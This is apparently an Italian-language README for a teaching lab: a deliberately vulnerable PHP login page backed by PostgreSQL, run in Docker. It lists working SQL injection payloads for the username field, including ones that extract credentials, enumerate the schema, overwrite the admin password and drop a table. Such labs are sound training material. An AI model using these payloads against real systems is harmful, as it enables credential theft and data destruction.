# SQL Injection Demo (PostgreSQL + PHP)

Questo progetto dimostra attacchi SQL Injection di tipo **in-band** (tautologia, commento, union select, piggybacked query) su un'applicazione PHP vulnerabile con backend PostgreSQL.

---

## 🐳 Avvio dell'ambiente con Docker

Assicurati di avere **Docker e Docker Compose** installati.

### ▶️ Avvio

Nel terminale, esegui:

```bash
docker-compose down -v      # (facoltativo) pulisce volumi e container precedenti
docker-compose up --build   # avvia e costruisce l'ambiente
```

### 🌐 Accesso all'applicazione

Apri il browser su:

```
http://localhost:8080
```

Vedrai una pagina di login vulnerabile.

---

## 🛠️ Accesso diretto al database PostgreSQL

### Entra nel container:

```bash
docker exec -it db psql -U user -d mydb
```

### Una volta dentro `psql`, puoi eseguire:

```sql
\dt                                -- mostra le tabelle
SELECT * FROM utenti;              -- mostra tutti gli utenti
SELECT table_name FROM information_schema.tables WHERE table_schema='public'; -- mostra tutte le tabelle visibili
SELECT column_name FROM information_schema.columns WHERE table_name='utenti'; -- mostra colonne della tabella 'utenti'
```

Per uscire da `psql`:

```sql
\q
```

---

## ⚠️ Note importanti

- Le credenziali del DB sono definite in `docker-compose.yml`.
- Lo script `init.sql` crea la tabella `utenti` con alcuni account di test.
- Tutti i test di SQL Injection vanno eseguiti dalla pagina web (form login).

---

## 🧪 Esempi di SQL Injection (da provare nel campo "username")

| Tipo          | Injection                                                                 |
|---------------|---------------------------------------------------------------------------|
| Tautologia    | `' OR '1'='1' --`                                                         |
| Commento      | `' --`                                                                    |
| Union Select  | `' UNION SELECT id, username, password FROM utenti --`                    |
| Esfiltrazione | `' UNION SELECT NULL, username || ':' || password, NULL FROM utenti --`  |
| Enum. tabelle | `' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema='public' --` |
| Enum. colonne | `' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='utenti' --` |
| Modifica dati | `'; UPDATE utenti SET password='hacked' WHERE username='admin'; --`       |
| Drop Table    | `'; DROP TABLE utenti; --`                                                |

---

## 🧑‍💻 Autore

Progetto didattico per simulare SQL Injection in ambiente controllato.

> ⚠️ Da utilizzare solo a fini educativi.